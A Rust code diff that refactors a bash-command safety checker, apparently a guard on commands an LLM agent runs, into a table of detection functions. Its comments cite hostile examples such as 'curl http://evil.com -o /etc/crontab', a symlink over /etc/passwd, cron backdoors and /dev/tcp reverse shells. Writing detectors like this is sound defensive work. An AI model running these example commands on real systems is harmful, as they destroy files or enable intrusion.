@@ -24,173 +24,56 @@
 //! - Symlink attacks on system files (`ln -sf /dev/null /etc/passwd`)
 //! - Archive extraction to system paths (`tar -xf ... -C /etc/`)
 
+/// A safety check function: receives `(cmd, cmd_lower)` and returns
+/// `Some(reason)` if the command matches a destructive pattern.
+type SafetyCheck = fn(&str, &str) -> Option<String>;
+
+/// All safety checks, in priority order. Each receives `(cmd, cmd_lower)`.
+/// To add a new check: write the function with signature `fn(&str, &str) -> Option<String>`
+/// and append it here.
+const SAFETY_CHECKS: &[SafetyCheck] = &[
+    check_rm_destruction,
+    check_git_force,
+    check_permission_changes,
+    check_file_overwrites,
+    check_system_commands,
+    check_database_destruction,
+    check_pipe_from_internet,
+    check_process_killing,
+    check_disk_operations,
+    check_process_substitution,
+    check_fork_bomb,
+    check_xargs_destruction,
+    check_mv_system_paths,
+    check_cp_system_paths,
+    check_env_destruction,
+    check_crontab_removal,
+    check_raw_device_write,
+    check_firewall_flush,
+    check_history_destruction,
+    check_pkill,
+    check_critical_file_permissions,
+    check_bare_truncation,
+    check_reverse_shell,
+    check_find_destruction,
+    check_standalone_destruction,
+    check_tee_to_sensitive_paths,
+    check_systemctl_mask,
+    check_append_to_critical_files,
+    check_download_to_system_path,
+    check_pipe_to_interpreter,
+    check_symlink_attack,
+    check_archive_extraction_to_system,
+];
+
 /// Analyze a bash command for potentially dangerous patterns.
 /// Returns `Some(reason)` if the command looks destructive.
 pub fn analyze_bash_command(command: &str) -> Option<String> {
     let cmd = command.trim();
     let cmd_lower = cmd.to_lowercase();
-
-    // 1. Filesystem destruction: rm -rf with broad/dangerous paths
-    if let Some(reason) = check_rm_destruction(cmd) {
-        return Some(reason);
-    }
-
-    // 2. Force git operations
-    if let Some(reason) = check_git_force(cmd) {
-        return Some(reason);
-    }
-
-    // 3. Permission changes
-    if let Some(reason) = check_permission_changes(cmd) {
-        return Some(reason);
-    }
-
-    // 4. File overwrites via redirection to sensitive paths
-    if let Some(reason) = check_file_overwrites(cmd) {
-        return Some(reason);
-    }
-
-    // 5. System commands
-    if let Some(reason) = check_system_commands(&cmd_lower) {
-        return Some(reason);
-    }
-
-    // 6. Database destruction (case-insensitive)
-    if let Some(reason) = check_database_destruction(&cmd_lower) {
-        return Some(reason);
-    }
-
-    // 7. Pipe from internet
-    if let Some(reason) = check_pipe_from_internet(&cmd_lower) {
-        return Some(reason);
-    }
-
-    // 8. Process killing
-    if let Some(reason) = check_process_killing(cmd) {
-        return Some(reason);
-    }
-
-    // 9. Disk operations
-    if let Some(reason) = check_disk_operations(&cmd_lower) {
-        return Some(reason);
-    }
-
-    // 10. Process substitution from internet
-    if let Some(reason) = check_process_substitution(&cmd_lower) {
-        return Some(reason);
-    }
-
-    // 11. Fork bombs
-    if let Some(reason) = check_fork_bomb(cmd, &cmd_lower) {
-        return Some(reason);
-    }
-
-    // 12. Destructive xargs
-    if let Some(reason) = check_xargs_destruction(cmd) {
-        return Some(reason);
-    }
-
-    // 13. Moving files to system paths
-    if let Some(reason) = check_mv_system_paths(cmd) {
-        return Some(reason);
-    }
-
-    // 13b. Copying files to system paths
-    if let Some(reason) = check_cp_system_paths(cmd) {
-        return Some(reason);
-    }
-
-    // 14. Environment variable destruction
-    if let Some(reason) = check_env_destruction(cmd) {
-        return Some(reason);
-    }
-
-    // 15. Crontab removal
-    if let Some(reason) = check_crontab_removal(cmd) {
-        return Some(reason);
-    }
-
-    // 16. Raw device writes
-    if let Some(reason) = check_raw_device_write(cmd) {
-        return Some(reason);
-    }
-
-    // 17. Firewall flushing
-    if let Some(reason) = check_firewall_flush(&cmd_lower) {
-        return Some(reason);
-    }
-
-    // 18. History destruction
-    if let Some(reason) = check_history_destruction(cmd) {
-        return Some(reason);
-    }
-
-    // 19. Broad process killing (pkill, kill with signal names)
-    if let Some(reason) = check_pkill(cmd) {
-        return Some(reason);
-    }
-
-    // 20. chmod/chown on critical system files (even without -R)
-    if let Some(reason) = check_critical_file_permissions(cmd) {
-        return Some(reason);
-    }
-
-    // 21. Bare file truncation via > (no command before redirect)
-    if let Some(reason) = check_bare_truncation(cmd) {
-        return Some(reason);
-    }
-
-    // 22. Reverse shells and network exfiltration
-    if let Some(reason) = check_reverse_shell(&cmd_lower) {
-        return Some(reason);
-    }
-
-    // 23. find -delete / find -exec rm (destructive find operations)
-    if let Some(reason) = check_find_destruction(cmd, &cmd_lower) {
-        return Some(reason);
-    }
-
-    // 24. Standalone truncate/shred/wipefs on dangerous targets
-    if let Some(reason) = check_standalone_destruction(cmd) {
-        return Some(reason);
-    }
-
-    // 25. tee to sensitive paths (same paths as check_file_overwrites)
-    if let Some(reason) = check_tee_to_sensitive_paths(cmd) {
-        return Some(reason);
-    }
-
-    // 26. systemctl mask (more destructive than stop/disable — makes service permanently unstartable)
-    if let Some(reason) = check_systemctl_mask(&cmd_lower) {
-        return Some(reason);
-    }
-
-    // 27. Append to critical auth/config files (privilege escalation vector)
-    if let Some(reason) = check_append_to_critical_files(cmd) {
-        return Some(reason);
-    }
-
-    // 28. Direct download to system paths (curl -o / wget -O)
-    if let Some(reason) = check_download_to_system_path(cmd) {
-        return Some(reason);
-    }
-
-    // 29. Pipe from internet to script interpreters (python, perl, ruby, node)
-    if let Some(reason) = check_pipe_to_interpreter(&cmd_lower) {
-        return Some(reason);
-    }
-
-    // 30. Symlink attacks on system files
-    if let Some(reason) = check_symlink_attack(cmd) {
-        return Some(reason);
-    }
-
-    // 31. Archive extraction to system paths
-    if let Some(reason) = check_archive_extraction_to_system(cmd) {
-        return Some(reason);
-    }
-
-    None
+    SAFETY_CHECKS
+        .iter()
+        .find_map(|check| check(cmd, &cmd_lower))
 }
 
 /// Check if a character position is at a word boundary (start of a command/token).
@@ -249,7 +132,7 @@ const SYSTEM_TARGET_PATHS: &[&str] = &[
 ];
 
 /// Check for rm -rf with dangerous target paths.
-fn check_rm_destruction(cmd: &str) -> Option<String> {
+fn check_rm_destruction(cmd: &str, _cmd_lower: &str) -> Option<String> {
     // Find all occurrences of "rm " in the command
     let mut search_from = 0;
     while let Some(pos) = cmd[search_from..].find("rm ") {
@@ -314,7 +197,7 @@ fn check_rm_destruction(cmd: &str) -> Option<String> {
 }
 
 /// Check for force git operations.
-fn check_git_force(cmd: &str) -> Option<String> {
+fn check_git_force(cmd: &str, _cmd_lower: &str) -> Option<String> {
     // git push --force or git push -f (but NOT --force-with-lease which is safer)
     if cmd.contains("git") && cmd.contains("push") {
         // Check for -f as standalone flag, combined short flags (e.g. -uf), or --force
@@ -349,7 +232,7 @@ fn check_git_force(cmd: &str) -> Option<String> {
 }
 
 /// Check for dangerous permission changes.
-fn check_permission_changes(cmd: &str) -> Option<String> {
+fn check_permission_changes(cmd: &str, _cmd_lower: &str) -> Option<String> {
     // chmod -R 777
     if cmd.contains("chmod") && cmd.contains("-R") && cmd.contains("777") {
         return Some(
@@ -383,7 +266,7 @@ fn check_permission_changes(cmd: &str) -> Option<String> {
 }
 
 /// Check for file overwrites via redirection to sensitive paths.
-fn check_file_overwrites(cmd: &str) -> Option<String> {
+fn check_file_overwrites(cmd: &str, _cmd_lower: &str) -> Option<String> {
     // Check for > (overwrite) redirection to sensitive files
     // Match "> /etc/passwd" but not ">> /etc/passwd" (append is less dangerous)
     for path in SENSITIVE_PATHS {
@@ -401,7 +284,7 @@ fn check_file_overwrites(cmd: &str) -> Option<String> {
 }
 
 /// Check for system shutdown/reboot commands.
-fn check_system_commands(cmd_lower: &str) -> Option<String> {
+fn check_system_commands(_cmd: &str, cmd_lower: &str) -> Option<String> {
     let system_cmds = [
         ("shutdown", "System shutdown command detected"),
         ("reboot", "System reboot command detected"),
@@ -435,7 +318,7 @@ fn check_system_commands(cmd_lower: &str) -> Option<String> {
 }
 
 /// Check for database destruction commands (case-insensitive).
-fn check_database_destruction(cmd_lower: &str) -> Option<String> {
+fn check_database_destruction(_cmd: &str, cmd_lower: &str) -> Option<String> {
     let db_patterns = [
         ("drop table", "Database destruction: DROP TABLE detected"),
         (
@@ -463,7 +346,7 @@ fn check_database_destruction(cmd_lower: &str) -> Option<String> {
 }
 
 /// Check for piping internet content to a shell.
-fn check_pipe_from_internet(cmd_lower: &str) -> Option<String> {
+fn check_pipe_from_internet(_cmd: &str, cmd_lower: &str) -> Option<String> {
     // Detect: curl ... | bash, curl ... | sh, wget ... | bash, wget ... | sh
     // Also handles multi-pipe chains like: curl ... | tee /tmp/f | bash
     let fetchers = ["curl", "wget"];
@@ -507,7 +390,7 @@ fn check_pipe_from_internet(cmd_lower: &str) -> Option<String> {
 }
 
 /// Check for dangerous process killing.
-fn check_process_killing(cmd: &str) -> Option<String> {
+fn check_process_killing(cmd: &str, _cmd_lower: &str) -> Option<String> {
     // kill -9 1 (killing init/PID 1)
     if cmd.contains("kill") && cmd.contains("-9") && cmd.contains(" 1") {
         // Be more precise: look for "kill -9 1" as a specific pattern
@@ -537,7 +420,7 @@ fn check_process_killing(cmd: &str) -> Option<String> {
 }
 
 /// Check for dangerous disk operations.
-fn check_disk_operations(cmd_lower: &str) -> Option<String> {
+fn check_disk_operations(_cmd: &str, cmd_lower: &str) -> Option<String> {
     let disk_cmds = [
         (
             "dd if=",
@@ -569,7 +452,7 @@ fn check_disk_operations(cmd_lower: &str) -> Option<String> {
 }
 
 /// Check for process substitution from internet (`bash <(curl ...)`, `sh <(wget ...)`).
-fn check_process_substitution(cmd_lower: &str) -> Option<String> {
+fn check_process_substitution(_cmd: &str, cmd_lower: &str) -> Option<String> {
     let fetchers = ["curl", "wget"];
     let shells = ["bash", "sh", "zsh"];
 
@@ -645,7 +528,7 @@ fn check_fork_bomb(cmd: &str, cmd_lower: &str) -> Option<String> {
 }
 
 /// Check for destructive commands via xargs.
-fn check_xargs_destruction(cmd: &str) -> Option<String> {
+fn check_xargs_destruction(cmd: &str, _cmd_lower: &str) -> Option<String> {
     if !cmd.contains("xargs") {
         return None;
     }
@@ -714,14 +597,14 @@ fn check_command_system_paths(
 }
 
 /// Check for moving files to system paths.
-fn check_mv_system_paths(cmd: &str) -> Option<String> {
+fn check_mv_system_paths(cmd: &str, _cmd_lower: &str) -> Option<String> {
     check_command_system_paths(cmd, "mv", "Moving file", "can break the system")
 }
 
 /// Check for copying files to system paths.
 /// Similar to `check_mv_system_paths` but for `cp`, which can overwrite
 /// critical system files (e.g., `cp malicious.sh /etc/cron.d/backdoor`).
-fn check_cp_system_paths(cmd: &str) -> Option<String> {
+fn check_cp_system_paths(cmd: &str, _cmd_lower: &str) -> Option<String> {
     check_command_system_paths(
         cmd,
         "cp",
@@ -731,7 +614,7 @@ fn check_cp_system_paths(cmd: &str) -> Option<String> {
 }
 
 /// Check for environment variable destruction (unsetting critical vars like PATH).
-fn check_env_destruction(cmd: &str) -> Option<String> {
+fn check_env_destruction(cmd: &str, _cmd_lower: &str) -> Option<String> {
     let critical_vars = [
         "PATH",
         "HOME",
@@ -793,7 +676,7 @@ fn check_env_destruction(cmd: &str) -> Option<String> {
 }
 
 /// Check for crontab removal.
-fn check_crontab_removal(cmd: &str) -> Option<String> {
+fn check_crontab_removal(cmd: &str, _cmd_lower: &str) -> Option<String> {
     if cmd.contains("crontab") {
         // crontab -r removes all cron jobs
         if cmd.contains("-r") {
@@ -817,7 +700,7 @@ fn check_crontab_removal(cmd: &str) -> Option<String> {
 }
 
 /// Check for writes to raw device files.
-fn check_raw_device_write(cmd: &str) -> Option<String> {
+fn check_raw_device_write(cmd: &str, _cmd_lower: &str) -> Option<String> {
     let device_patterns = [
         "/dev/sda",
         "/dev/sdb",
@@ -860,7 +743,7 @@ fn check_raw_device_write(cmd: &str) -> Option<String> {
 }
 
 /// Check for firewall flushing/disabling commands.
-fn check_firewall_flush(cmd_lower: &str) -> Option<String> {
+fn check_firewall_flush(_cmd: &str, cmd_lower: &str) -> Option<String> {
     // iptables -F flushes all rules (leaves system unprotected)
     // Note: -F (flush) is case-sensitive in iptables, but we work on cmd_lower.
     // We check the original command via token matching to distinguish -F (flush)
@@ -915,7 +798,7 @@ fn check_firewall_flush(cmd_lower: &str) -> Option<String> {
 }
 
 /// Check for shell history destruction.
-fn check_history_destruction(cmd: &str) -> Option<String> {
+fn check_history_destruction(cmd: &str, _cmd_lower: &str) -> Option<String> {
     // history -c clears the history list
     if cmd.contains("history") {
         let tokens: Vec<&str> = cmd.split_whitespace().collect();
@@ -954,7 +837,7 @@ fn check_history_destruction(cmd: &str) -> Option<String> {
 }
 
 /// Check for broad process killing patterns (pkill, kill with signal names).
-fn check_pkill(cmd: &str) -> Option<String> {
+fn check_pkill(cmd: &str, _cmd_lower: &str) -> Option<String> {
     // pkill without a specific process name is very dangerous
     // but pkill with a specific target is common and useful, so we only flag
     // patterns that kill broadly
@@ -978,7 +861,7 @@ fn check_pkill(cmd: &str) -> Option<String> {
 ///
 /// The existing `check_permission_changes` only catches `chmod -R 777`.
 /// This catches targeted permission changes on specific sensitive files.
-fn check_critical_file_permissions(cmd: &str) -> Option<String> {
+fn check_critical_file_permissions(cmd: &str, _cmd_lower: &str) -> Option<String> {
     let critical_files = [
         "/etc/passwd",
         "/etc/shadow",
@@ -1019,7 +902,7 @@ fn check_critical_file_permissions(cmd: &str) -> Option<String> {
 /// A bare `> file.conf` with no command before the redirect operator truncates
 /// the file to zero bytes. This is an easy mistake that destroys data silently.
 /// We only flag this for non-temporary, non-devnull paths.
-fn check_bare_truncation(cmd: &str) -> Option<String> {
+fn check_bare_truncation(cmd: &str, _cmd_lower: &str) -> Option<String> {
     // Check each command segment (separated by ; or &&)
     let segments: Vec<&str> = cmd.split(';').flat_map(|s| s.split("&&")).collect();
     for segment in &segments {
@@ -1044,7 +927,7 @@ fn check_bare_truncation(cmd: &str) -> Option<String> {
 }
 
 /// Check for reverse shells and network exfiltration patterns.
-fn check_reverse_shell(cmd_lower: &str) -> Option<String> {
+fn check_reverse_shell(_cmd: &str, cmd_lower: &str) -> Option<String> {
     // Bash built-in reverse shell: /dev/tcp/ or /dev/udp/
     if cmd_lower.contains("/dev/tcp/") || cmd_lower.contains("/dev/udp/") {
         return Some(
@@ -1138,7 +1021,7 @@ fn check_find_destruction(cmd: &str, cmd_lower: &str) -> Option<String> {
 }
 
 /// Check for standalone destructive commands: truncate, shred, wipefs on dangerous targets.
-fn check_standalone_destruction(cmd: &str) -> Option<String> {
+fn check_standalone_destruction(cmd: &str, _cmd_lower: &str) -> Option<String> {
     let destructive_tools: &[(&str, &str)] = &[
         (
             "truncate",
@@ -1218,7 +1101,7 @@ const SENSITIVE_PATHS: &[&str] = &[
 /// LLMs commonly generate `echo "..." | tee /etc/somefile` or
 /// `echo "..." | sudo tee /etc/somefile` which bypasses the redirect-based
 /// check in `check_file_overwrites`. This catches both `tee` and `tee -a`.
-fn check_tee_to_sensitive_paths(cmd: &str) -> Option<String> {
+fn check_tee_to_sensitive_paths(cmd: &str, _cmd_lower: &str) -> Option<String> {
     // Find all occurrences of "tee " in the command
     let mut search_from = 0;
     while let Some(pos) = cmd[search_from..].find("tee ") {
@@ -1257,7 +1140,7 @@ fn check_tee_to_sensitive_paths(cmd: &str) -> Option<String> {
 /// This is more destructive than `systemctl stop` or `systemctl disable` because
 /// `mask` replaces the unit file with a symlink to /dev/null, making the service
 /// impossible to start even manually until explicitly unmasked.
-fn check_systemctl_mask(cmd_lower: &str) -> Option<String> {
+fn check_systemctl_mask(_cmd: &str, cmd_lower: &str) -> Option<String> {
     if let Some(pos) = cmd_lower.find("systemctl mask") {
         if is_at_word_boundary(cmd_lower, pos) {
             // Make sure "mask" is a complete word (not "mask-something")
@@ -1293,7 +1176,7 @@ const CRITICAL_APPEND_PATHS: &[&str] = &[
 /// While `>>` (append) is generally less dangerous than `>` (overwrite), appending
 /// to auth files like `/etc/passwd`, `/etc/sudoers`, or `~/.ssh/authorized_keys`
 /// is a well-known privilege escalation technique.
-fn check_append_to_critical_files(cmd: &str) -> Option<String> {
+fn check_append_to_critical_files(cmd: &str, _cmd_lower: &str) -> Option<String> {
     for path in CRITICAL_APPEND_PATHS {
         let append_pattern = format!(">> {path}");
         if cmd.contains(&append_pattern) {
@@ -1320,7 +1203,7 @@ fn check_append_to_critical_files(cmd: &str) -> Option<String> {
 /// Commands like `curl http://evil.com -o /etc/crontab` or `wget http://evil.com -O /etc/passwd`
 /// bypass the pipe-to-shell check because no pipe is involved — the file is written directly
 /// to a dangerous location.
-fn check_download_to_system_path(cmd: &str) -> Option<String> {
+fn check_download_to_system_path(cmd: &str, _cmd_lower: &str) -> Option<String> {
     let cmd_lower = cmd.to_lowercase();
     // curl -o <path> or curl --output <path>
     if cmd_lower.contains("curl") {
@@ -1366,7 +1249,7 @@ fn is_system_target(path: &str) -> bool {
 /// The existing `check_pipe_from_internet` catches `curl | bash/sh/zsh`.
 /// This extends coverage to `curl | python3`, `curl | perl`, `curl | ruby`,
 /// `curl | node`, which are equally dangerous.
-fn check_pipe_to_interpreter(cmd_lower: &str) -> Option<String> {
+fn check_pipe_to_interpreter(_cmd: &str, cmd_lower: &str) -> Option<String> {
     let fetchers = ["curl", "wget"];
     let interpreters = ["python3", "python", "perl", "ruby", "node"];
 
@@ -1396,7 +1279,7 @@ fn check_pipe_to_interpreter(cmd_lower: &str) -> Option<String> {
 /// `ln -sf /dev/null /etc/passwd` replaces the real file with a symlink, which
 /// can disable authentication or redirect reads to attacker-controlled data.
 /// `ln -sf /tmp/evil /etc/shadow` is similarly destructive.
-fn check_symlink_attack(cmd: &str) -> Option<String> {
+fn check_symlink_attack(cmd: &str, _cmd_lower: &str) -> Option<String> {
     let cmd_lower = cmd.to_lowercase();
     // Look for "ln" with -s (symbolic) and -f (force) flags targeting system paths
     if !cmd_lower.contains("ln ") {
@@ -1448,7 +1331,7 @@ fn check_symlink_attack(cmd: &str) -> Option<String> {
 ///
 /// `tar -xf evil.tar -C /etc/` or `unzip evil.zip -d /usr/bin/` can overwrite
 /// system files with attacker-controlled content from an archive.
-fn check_archive_extraction_to_system(cmd: &str) -> Option<String> {
+fn check_archive_extraction_to_system(cmd: &str, _cmd_lower: &str) -> Option<String> {
     let cmd_lower = cmd.to_lowercase();
 
     // tar extraction with -C (change directory) to system path
